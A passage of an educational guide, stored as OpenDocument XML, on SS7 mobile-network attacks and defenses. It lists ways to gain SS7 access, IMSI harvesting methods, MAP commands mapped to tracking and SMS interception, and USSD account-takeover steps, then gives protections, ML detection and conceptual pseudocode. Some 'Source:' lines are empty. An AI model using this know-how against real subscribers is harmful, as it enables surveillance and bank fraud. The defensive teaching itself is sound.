      <text:p text:style-name="Text_20_body">Attackers can disrupt your mobile service entirely by sending malicious SS7 messages that overload network nodes or modify your subscriber profile .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.6 USSD Account Takeover</text:h>
      <text:p text:style-name="Text_20_body">Attackers can use USSD (Unstructured Supplementary Service Data) codes combined with SS7 spoofing to take over mobile banking accounts .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>USSD ACCOUNT TAKEOVER <text:s text:c="24"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Step 1: Attacker spoofs victim's phone number <text:s text:c="16"/>│<text:line-break/>│ <text:s text:c="2"/>Step 2: Attacker dials USSD code for mobile banking <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="2"/>Step 3: Attacker changes PIN and adds new phone number <text:s text:c="7"/>│<text:line-break/>│ <text:s text:c="2"/>Step 4: Attacker uses new number and PIN to transfer money <text:s text:c="3"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>RESULT: Complete account takeover <text:s text:c="28"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">This technique has been documented by the International Telecommunication Union (ITU) as a real <text:soft-page-break/>attack vector against digital financial services .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔧 Part 3: Technical Attack Methods</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">3.1 How Attackers Get SS7 Access</text:h>
      <text:p text:style-name="Text_20_body">SS7 access is not exclusive to telecom operators. Attackers can obtain access through :</text:p>
      <table:table table:name="Table2" table:style-name="Table2">
        <table:table-column table:style-name="Table2.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Method</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Description</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.C1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Cost/Difficulty</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">GT Leasing</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Leasing Global Titles from operators who sell SS7 access</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.C2" office:value-type="string">
            <text:p text:style-name="P62">Thousands of dollars/month</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Compromised Operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Hacking into smaller telecom operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.C2" office:value-type="string">
            <text:p text:style-name="P62">Technical expertise</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Bribed Employees</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Paying insider at telecom company</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.C2" office:value-type="string">
            <text:p text:style-name="P62">Medium cost</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Dark Web Services</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Buying SS7 access-as-a-service</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.C2" office:value-type="string">
            <text:p text:style-name="P62">$500-5000/month</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Rogue Operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P62">Setting up fake operator with SS7 interconnects</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.C2" office:value-type="string">
            <text:p text:style-name="P62">High cost/complexity</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Security researcher Karsten Nohl explained: "Some of them sell their services on to third parties, some can be bribed, some can be hacked" .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">3.2 The Two-Step Attack Process</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 1: Obtain Victim's IMSI</text:span></text:p>
      <text:p text:style-name="Text_20_body">Your IMSI (International Mobile Subscriber Identity) is a unique 15-digit identifier for your SIM card. Attackers need this to appear legitimate .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>IMSI HARVESTING METHODS <text:s text:c="22"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Method 1: SS7 Routing Query <text:s text:c="35"/>│<text:line-break/>│ <text:s text:c="2"/>- Send "Send Routing Info" message with phone number <text:s text:c="9"/>│<text:line-break/>│ <text:s text:c="2"/>- Carrier responds with IMSI <text:s text:c="34"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Method 2: IMSI Catchers (Stingrays) <text:s text:c="26"/>│<text:line-break/>│ <text:s text:c="2"/>- Fake cell tower that forces phones to connect <text:s text:c="14"/>│<text:line-break/>│ <text:s text:c="2"/>- Harvests IMSI from all nearby phones <text:s text:c="23"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Method 3: Network Vulnerabilities <text:s text:c="29"/>│<text:line-break/>│ <text:s text:c="2"/>- Exploit SS7 or Diameter protocol flaws <text:s text:c="22"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 2: Execute SS7 Commands</text:span></text:p>
      <text:p text:style-name="Text_20_body">Once attackers have your IMSI and phone number, they can send any SS7 MAP (Mobile Application <text:soft-page-break/>Part) command to your carrier :</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>COMMON SS7 ATTACK COMMANDS <text:s text:c="19"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>anyTimeInterrogation <text:s text:c="3"/>→ Get subscriber location <text:s text:c="12"/>│<text:line-break/>│ <text:s text:c="2"/>provideSubscriberInfo <text:s text:c="2"/>→ Get subscriber information <text:s text:c="9"/>│<text:line-break/>│ <text:s text:c="2"/>updateLocation <text:s text:c="9"/>→ Redirect roaming/traffic <text:s text:c="11"/>│<text:line-break/>│ <text:s text:c="2"/>sendRoutingInfoForSM <text:s text:c="3"/>→ Intercept SMS <text:s text:c="22"/>│<text:line-break/>│ <text:s text:c="2"/>forwardSM <text:s text:c="14"/>→ Forward SMS to attacker <text:s text:c="12"/>│<text:line-break/>│ <text:s text:c="2"/>activateTraceMode <text:s text:c="6"/>→ Enable surveillance <text:s text:c="16"/>│<text:line-break/>│ <text:s text:c="2"/>sendRoutingInfo <text:s text:c="8"/>→ Intercept calls <text:s text:c="20"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">According to ITU research, these attacks form a "kill chain" where information gathering leads to data leak, which enables cyber attacks like account takeover .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📊 Part 4: Real-World Scale and Impact</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Current Statistics</text:h>
      <table:table table:name="Table3" table:style-name="Table3">
        <table:table-column table:style-name="Table3.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table3.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Metric</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table3.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Data</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="P62">Active network operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P62">1200+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="P62">Connected networks</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P62">4500+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="P62">Monthly malicious requests</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P62">Millions</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="P62">Annual tracking attempts</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P62">2.5 million+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="P62">Years until SS7 sunset</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P62">Estimated 20+ years</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Source:</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Real-World Attacks</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Case Study 1: Bank Account Theft</text:span> Using SS7 vulnerabilities, criminals have stolen one-time passwords to empty bank accounts. Researchers demonstrated intercepting a one-time password for a YouTube account, proving SMS-based 2FA is vulnerable .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Case Study 2: Espionage</text:span> Government actors have used SS7 vulnerabilities to track political figures and intercept their communications. The protocol's design flaws make it ideal for state-sponsored surveillance .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Case Study 3: Financial Fraud</text:span> The ITU documented attackers using USSD commands via SS7 spoofing to take over mobile money accounts and transfer funds to themselves .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>🛡️ Part 5: How to Protect Yourself</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">5.1 Individual Protection Measures</text:h>
      <table:table table:name="Table4" table:style-name="Table4">
        <table:table-column table:style-name="Table4.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table4.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Protection</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table4.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">How It Works</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table4.C1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Effectiveness</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Stop using SMS-based 2FA</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Switch to authenticator apps (Google Authenticator, Authy)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">✅ Completely bypasses SS7</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Use encrypted messaging apps</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Signal, WhatsApp, Telegram (end-to-end encrypted)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">✅ Protects message content</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Contact carrier for protection</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Ask about SS7 firewall protection</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">⚠️ Carrier-dependent</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Use VoIP for sensitive calls</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Call over internet (WhatsApp, Signal, FaceTime)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">✅ Bypasses cellular network</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Second phone number for banking</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Use separate number only for financial services</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">⚠️ Reduces exposure</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Monitor for unusual activity</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="P62">Unexpected SMS or call behavior</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.C2" office:value-type="string">
            <text:p text:style-name="P62">⚠️ Detection only</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Most Important:</text:span> Switch from SMS-based 2FA to authenticator apps immediately. This single change eliminates the most dangerous SS7 attack vector .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">5.2 Organizational Protection</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">For Telecom Operators:</text:span></text:p>
      <table:table table:name="Table5" table:style-name="Table5">
        <table:table-column table:style-name="Table5.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table5.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Measure</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table5.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Implementation</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P62">SS7 Firewalls</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P62">Deploy firewalls following GSMA FS.11 guidelines</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P62">Traffic filtering</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P62">Block Category 1, 2, and 3 MAP signaling traffic as defined by GSMA</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P62">Anomaly detection</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P62">Use machine learning-based detection systems</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P62">Continuous testing</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P62">Regular interconnect penetration tests</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P62">Access control</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P62">Strictly control GT leasing</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">SS7 firewalls are the primary defense. They must be properly configured to block malicious messages while allowing legitimate roaming traffic. The GSMA has published detailed guidelines (FS.07, FS.11, IR.82) for proper configuration .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">5.3 Detection Methods</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">For Individual Users (Without Special Equipment):</text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Warning signs that may indicate SS7 compromise :</text:p>
      <text:list text:style-name="L21">
        <text:list-item>
          <text:p text:style-name="P64">Unexplained battery drain (malware/background activity)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">Unexpected SMS messages (especially with verification codes)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">Calls going directly to voicemail without ringing</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">Unusual text messages in your outbox</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">Increased data usage</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Detection Tools for Telecom Operators:</text:span></text:p>
      <text:p text:style-name="Text_20_body">The telecom industry uses specialized detection systems:</text:p>
      <table:table table:name="Table6" table:style-name="Table6">
        <table:table-column table:style-name="Table6.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table6.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Tool/Method</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table6.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Description</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P62">TAD (Telecom Attack Discovery)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.B2" office:value-type="string">
            <text:p text:style-name="P62">Positive Technologies solution integrated with SIEM</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P62">Machine Learning detection</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.B2" office:value-type="string">
            <text:p text:style-name="P62">Random Forest (94% accuracy), Autoencoders</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P62">Anomaly-based detection</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.B2" office:value-type="string">
            <text:p text:style-name="P62">Profile subscriber behavior to detect deviations</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P62">MAP message filtering</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.B2" office:value-type="string">
            <text:p text:style-name="P62">Block suspicious SS7 commands</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Source:</text:p>
      <text:p text:style-name="Text_20_body">Research has shown that machine learning can effectively detect SS7 attacks by analyzing subscriber behavior patterns such as:</text:p>
      <text:list text:style-name="L22">
        <text:list-item>
          <text:p text:style-name="P65">Time between location updates</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65">Distance traveled between updates</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65">Frequency of location updates</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65">Message network origin</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">The Random Forest algorithm achieved 94% accuracy in detecting SS7 attacks in testing environments .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔬 Part 6: Hands-On Learning (Legal Lab Environment)</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">6.1 Setting Up a Safe SS7 Learning Lab</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">⚠️ WARNING: This is for educational purposes in ISOLATED LAB environments only. Never test against real networks without authorization.</text:span></text:p>
      <text:p text:style-name="P44"># Step 1: Understanding the SS7MAP tool (for research only)<text:line-break/># This tool demonstrates how SS7 vulnerabilities work<text:line-break/>git clone https://github.com/ernw/ss7map.git<text:line-break/>cd ss7map<text:line-break/>pip install -r requirements.txt<text:line-break/><text:soft-page-break/><text:line-break/># Note: This requires SS7 network access - NOT available on standard internet<text:line-break/># Only works in specialized telecom lab environments</text:p>
      <text:p text:style-name="Text_20_body">Source:</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">What You Need for a Legal SS7 Lab:</text:span></text:p>
      <text:list text:style-name="L23">
        <text:list-item>
          <text:p text:style-name="P66">Dedicated test SIM cards</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66">Isolated SS7 network environment (not connected to real carriers)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66">Authorization from the network owner</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66">Specialized SS7 testing equipment (not available to general public)</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">6.2 Understanding the Attack Flow (Conceptual)</text:h>
      <text:p text:style-name="P44"># PSEUDOCODE - For educational understanding only<text:line-break/># This demonstrates the CONCEPT of an SS7 attack, not actual exploitation<text:line-break/><text:line-break/>class SS7AttackConcept:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Conceptual demonstration of SS7 attack vectors<text:line-break/> <text:s text:c="3"/>FOR EDUCATIONAL PURPOSES ONLY - Does NOT actually execute attacks<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def explain_location_tracking(self, phone_number):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>How location tracking conceptually works:<text:line-break/> <text:s text:c="7"/>1. Attacker sends 'anyTimeInterrogation' to carrier<text:line-break/> <text:s text:c="7"/>2. Carrier responds with MSC/VLR location<text:line-break/> <text:s text:c="7"/>3. MSC ID maps to physical location<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>print(f"Concept: Location tracking request for {phone_number}")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ anyTimeInterrogation message sent to HLR")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ HLR responds with serving MSC/VLR address")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ MSC address mapped to geographic location")<text:line-break/> <text:s text:c="7"/>return "Location concept understood"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def explain_sms_interception(self, phone_number):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>How SMS interception conceptually works:<text:line-break/> <text:s text:c="7"/>1. Attacker sends 'sendRoutingInfoForSM' <text:line-break/> <text:s text:c="7"/>2. Carrier thinks attacker's MSC serves the subscriber<text:line-break/> <text:s text:c="7"/>3. SMS routed to attacker instead of victim<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>print(f"Concept: SMS intercept request for {phone_number}")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ sendRoutingInfoForSM sent to HLR")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ HLR returns routing info pointing to attacker")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>→ SMS delivered to attacker's MSC")<text:line-break/> <text:s text:c="7"/>return "SMS intercept concept understood"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def explain_defense(self):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>How SS7 firewalls block attacks:<text:line-break/> <text:s text:c="7"/>1. Monitor for suspicious SS7 message patterns<text:line-break/> <text:s text:c="7"/>2. Verify message origin against roaming agreements<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>3. Block messages that violate GSMA categories<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>print("SS7 Firewall Defense:")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>1. Filter Category 1 traffic (intra-network only)")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>2. Verify Category 2 traffic (home network)")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>3. Validate Category 3 traffic (visited network)")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>4. Block anyTimeInterrogation from unauthorized sources")<text:line-break/> <text:s text:c="7"/>print(" <text:s/>5. Rate-limit location requests")<text:line-break/><text:line-break/># Educational demonstration<text:line-break/>concept = SS7AttackConcept()<text:line-break/>concept.explain_location_tracking("+1234567890")<text:line-break/>concept.explain_sms_interception("+1234567890")<text:line-break/>concept.explain_defense()</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Note:</text:span> Real SS7 access requires specialized equipment, carrier agreements, or legal authorization. The code above is purely conceptual to aid understanding.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">6.3 Research-Based Detection Simulation</text:h>
      <text:p text:style-name="Text_20_body">The Norwegian University of Science and Technology conducted research on SS7 attack detection using machine learning . Their approach can be summarized:</text:p>
      <text:p text:style-name="P44"># PSEUDOCODE - Based on academic research (NTNU 2016)<text:line-break/># Demonstrates detection methodology, not actual exploitation<text:line-break/><text:line-break/>class SS7DetectionMethodology:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Based on academic research from NTNU<text:line-break/> <text:s text:c="3"/>Features used to detect SS7 attacks via anomaly detection<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def extract_features_for_detection(self, subscriber_data):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Features that help detect SS7 attacks:<text:line-break/> <text:s text:c="7"/>- Time between location updates<text:line-break/> <text:s text:c="7"/>- Distance traveled between updates<text:line-break/> <text:s text:c="7"/>- Frequency of location updates<text:line-break/> <text:s text:c="7"/>- Message network origin<text:line-break/> <text:s text:c="7"/>- Byte length of messages<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>features = {<text:line-break/> <text:s text:c="11"/>"time_since_previous_update": "Detects abnormal movement patterns",<text:line-break/> <text:s text:c="11"/>"distance_traveled": "Identifies impossible geographic jumps",<text:line-break/> <text:s text:c="11"/>"update_frequency": "Flags rapid location changes",<text:line-break/> <text:s text:c="11"/>"network_origin": "Verifies message source legitimacy",<text:line-break/> <text:s text:c="11"/>"message_byte_length": "Catches malformed attack packets"<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print("SS7 Attack Detection Features:")<text:line-break/> <text:s text:c="7"/>for feature, purpose in features.items():<text:line-break/> <text:s text:c="11"/>print(f" <text:s/>- {feature}: {purpose}")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># S-H-ESD algorithm (Twitter's AnomalyDetection) used in research<text:line-break/> <text:s text:c="7"/>print("\nAlgorithm: Seasonal Hybrid ESD (S-H-ESD)")<text:line-break/> <text:s text:c="7"/>print("Purpose: Detects anomalies in time-series subscriber data")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return features</text:p>
